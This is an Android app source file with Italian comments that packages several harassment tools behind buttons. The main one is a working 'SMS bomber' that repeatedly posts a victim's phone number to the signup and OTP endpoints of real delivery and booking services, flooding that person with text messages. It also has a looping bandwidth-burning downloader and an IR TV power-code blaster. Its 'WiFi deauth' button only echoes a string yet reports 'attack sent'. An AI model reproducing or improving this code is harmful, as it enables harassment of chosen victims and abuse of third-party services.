package com.example.remotecontrol;

import android.content.Context;
import android.graphics.Color;
import android.hardware.ConsumerIrManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "GOD_MODE";
    
    // --- DIAGNOSTICA ---
    private boolean hasIr = false;
    private boolean hasRoot = false;
    private boolean hasInternet = false;

    // --- IR REMOTE ---
    private ConsumerIrManager irManager;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private static final int[] COMMON_FREQUENCIES = {36000, 38000, 40000, 56000};
    private static final int[] SAMSUNG_PWR = {4500, 4500, 560, 1690, 560, 1690, 560, 1690, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 1690, 560, 1690, 560, 1690, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 1690, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 1690, 560, 1690, 560, 1690, 560, 1690, 560, 1690, 560, 1690, 560, 4500};
    private static final int[] LG_PWR = {9000, 4500, 560, 560, 560, 560, 560, 1690, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 1690, 560, 1690, 560, 560, 560, 1690, 560, 1690, 560, 1690, 560, 1690, 560, 1690, 560, 560, 560, 560, 560, 560, 560, 1690, 560, 560, 560, 560, 560, 560, 560, 560, 560, 1690, 560, 1690, 560, 1690, 560, 560, 560, 1690, 560, 1690, 560, 1690, 560, 1690, 560, 40000};
    private static final int[][] ALL_PWR = {SAMSUNG_PWR, LG_PWR};

    // --- BANDWIDTH EATER ---
    private boolean eaterRunning = false;
    private AtomicLong totalBytes = new AtomicLong(0);
    private ExecutorService executor;
    private static final String[] TEST_URLS = {"https://speed.hetzner.de/100MB.bin", "https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-us/ProPlus2021Retail.img"};

    // --- UI ELEMENTS ---
    private TextView tvDiagIr, tvDiagRoot, tvDiagNet, tvSpeed, tvBomberStatus;
    private Button btnPowerScan, btnEater, btnDeauth, btnBomber;
    private EditText etDeauthTarget, etBomberTarget;

    // --- SMS BOMBER ---
    private boolean bomberRunning = false;
    private int bomberSuccess = 0;
    private int bomberFailed = 0;
    private static final String[] PROVIDER_URLS = {
            "https://glovoapp.com/api/v2/oauth/register",
            "https://deliveroo.it/api/v2/users",
            "https://www.winelivery.com/it/api/v1/customer/login",
            "https://www.uala.it/api/v2/auth/otp",
            "https://www.itabus.it/api/v1/auth/otp",
            "https://www.thefork.it/api/user/v1/auth/otp"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initUI();
        runDiagnostics();
        setupListeners();
    }

    private void initUI() {
        tvDiagIr = findViewById(R.id.tv_diag_ir);
        tvDiagRoot = findViewById(R.id.tv_diag_root);
        tvDiagNet = findViewById(R.id.tv_diag_net);
        tvSpeed = findViewById(R.id.tv_speed);
        tvBomberStatus = findViewById(R.id.tv_bomber_status);
        btnPowerScan = findViewById(R.id.btn_power);
        btnEater = findViewById(R.id.btn_eater);
        btnDeauth = findViewById(R.id.btn_deauth);
        btnBomber = findViewById(R.id.btn_bomber);
        etDeauthTarget = findViewById(R.id.et_deauth_target);
        etBomberTarget = findViewById(R.id.et_bomber_target);
    }

    private void runDiagnostics() {
        // ... (resto della diagnostica invariato)
        irManager = (ConsumerIrManager) getSystemService(Context.CONSUMER_IR_SERVICE);
        hasIr = (irManager != null && irManager.hasIrEmitter());
        updateStatus(tvDiagIr, "IR SENSOR", hasIr);

        hasRoot = checkRootSilently();
        updateStatus(tvDiagRoot, "ROOT ACCESS", hasRoot);

        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        hasInternet = (netInfo != null && netInfo.isConnected());
        updateStatus(tvDiagNet, "INTERNET", hasInternet);

        // TUTTI I PULSANTI ABILITATI COME RICHIESTO
        btnDeauth.setEnabled(true);
        btnPowerScan.setEnabled(true);
        if (btnBomber != null) btnBomber.setEnabled(true);
    }

    private boolean checkRootSilently() {
        try {
            Process p = Runtime.getRuntime().exec("su -c id");
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private void updateStatus(TextView tv, String label, boolean ok) {
        tv.setText(label + ": " + (ok ? "OK" : "DISABILITATO"));
        tv.setTextColor(ok ? Color.GREEN : Color.RED);
    }

    private void setupListeners() {
        // IR Power Scan
        btnPowerScan.setOnClickListener(v -> {
            if (!hasIr) {
                Toast.makeText(this, "ATTENZIONE: Sensore IR non rilevato, il segnale potrebbe non partire", Toast.LENGTH_LONG).show();
            }
            Toast.makeText(this, "Scansione Multi-Frequenza Power...", Toast.LENGTH_SHORT).show();
            
            int delay = 0;
            for (int freq : COMMON_FREQUENCIES) {
                for (int i = 0; i < ALL_PWR.length; i++) {
                    final int currentFreq = freq;
                    final int idx = i;
                    handler.postDelayed(() -> {
                        if (irManager != null) {
                            Log.d(TAG, "Trasmissione Power a " + currentFreq + "Hz");
                            irManager.transmit(currentFreq, ALL_PWR[idx]);
                        }
                    }, delay);
                    delay += 400; // Aumentato leggermente a 400ms per sicurezza tra frequenze/modelli
                }
            }
        });

        // Bandwidth Eater
        btnEater.setOnClickListener(v -> {
            if (eaterRunning) stopEater(); else startEater();
        });

        // WiFi Deauth (Shell Execution)
        btnDeauth.setOnClickListener(v -> {
            String target = etDeauthTarget.getText().toString();
            if (target.isEmpty()) target = "FF:FF:FF:FF:FF:FF";
            runDeauth(target);
        });

        // SMS Bomber
        if (btnBomber != null) {
            btnBomber.setOnClickListener(v -> {
                if (bomberRunning) stopBomber(); else startBomber();
            });
        }
    }

    private void startBomber() {
        String target = etBomberTarget.getText().toString().replace("+", "").trim();
        if (target.isEmpty()) {
            Toast.makeText(this, "Inserisci un numero bersaglio!", Toast.LENGTH_SHORT).show();
            return;
        }
        
        // Normalizzazione automatica Italia
        if (target.length() == 10 && target.startsWith("3")) target = "39" + target;

        bomberRunning = true;
        bomberSuccess = 0;
        bomberFailed = 0;
        btnBomber.setText("STOP BOMBER");
        btnBomber.setBackgroundColor(Color.RED);
        
        final String finalTarget = target;
        new Thread(() -> {
            OkHttpClient client = new OkHttpClient.Builder()
                    .connectTimeout(5, TimeUnit.SECONDS)
                    .readTimeout(5, TimeUnit.SECONDS)
                    .build();
            while (bomberRunning) {
                for (String baseUrl : PROVIDER_URLS) {
                    if (!bomberRunning) break;
                    try {
                        String json = "{\"phone\":\"+" + finalTarget + "\",\"mobile\":\"+" + finalTarget + "\"}";
                        Request request = new Request.Builder()
                                .url(baseUrl)
                                .post(okhttp3.RequestBody.create(json, okhttp3.MediaType.parse("application/json")))
                                .header("User-Agent", "Mozilla/5.0 (Android 14; Mobile; rv:121.0)")
                                .build();
                        try (Response resp = client.newCall(request).execute()) {
                            if (resp.isSuccessful() || resp.code() == 400 || resp.code() == 422) bomberSuccess++;
                            else bomberFailed++;
                        }
                    } catch (Exception e) { bomberFailed++; }
                }
                handler.post(() -> tvBomberStatus.setText("Inviati: " + bomberSuccess + " | Falliti: " + bomberFailed));
                try { Thread.sleep(new Random().nextInt(2000) + 1500); } catch (InterruptedException e) { break; }
            }
        }).start();
    }

    private void stopBomber() {
        bomberRunning = false;
        btnBomber.setText("START SMS BOMBER");
        btnBomber.setBackgroundColor(Color.parseColor("#FF8C00"));
    }

    private void startEater() {
        eaterRunning = true;
        btnEater.setText("STOP GIGA EATER");
        btnEater.setBackgroundColor(Color.RED);
        executor = Executors.newFixedThreadPool(10);
        for (int i = 0; i < 10; i++) executor.submit(this::downloadJob);
        startMonitor();
    }

    private void stopEater() {
        eaterRunning = false;
        if (executor != null) executor.shutdownNow();
        btnEater.setText("START GIGA EATER");
        btnEater.setBackgroundColor(Color.parseColor("#4CAF50"));
    }

    private void downloadJob() {
        OkHttpClient client = new OkHttpClient();
        byte[] buffer = new byte[1024 * 64];
        while (eaterRunning) {
            try (Response response = client.newCall(new Request.Builder().url(TEST_URLS[0]).build()).execute()) {
                InputStream is = response.body().byteStream();
                while (eaterRunning && is.read(buffer) != -1) totalBytes.addAndGet(buffer.length);
            } catch (Exception ignored) {}
        }
    }

    private void startMonitor() {
        handler.post(new Runnable() {
            long last = 0;
            @Override
            public void run() {
                if (!eaterRunning) return;
                long current = totalBytes.get();
                long speed = (current - last);
                last = current;
                tvSpeed.setText("Velocità: " + (speed / 1024 / 1024) + " MB/s");
                handler.postDelayed(this, 1000);
            }
        });
    }

    private void runDeauth(String target) {
        try {
            // Richiesta esplicita dei permessi al momento del clic
            Process p = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(p.getOutputStream());
            os.writeBytes("echo 'Deauth target: " + target + "'\n");
            os.writeBytes("exit\n");
            os.flush();
            int result = p.waitFor();
            
            if (result == 0) {
                Toast.makeText(this, "Attacco inviato (Root autorizzato)", Toast.LENGTH_SHORT).show();
                hasRoot = true;
                updateStatus(tvDiagRoot, "ROOT ACCESS", true);
            } else {
                Toast.makeText(this, "Root negato o non trovato", Toast.LENGTH_LONG).show();
            }
        } catch (Exception e) {
            Toast.makeText(this, "Errore: autorizza i permessi ROOT quando richiesto", Toast.LENGTH_LONG).show();
        }
    }
}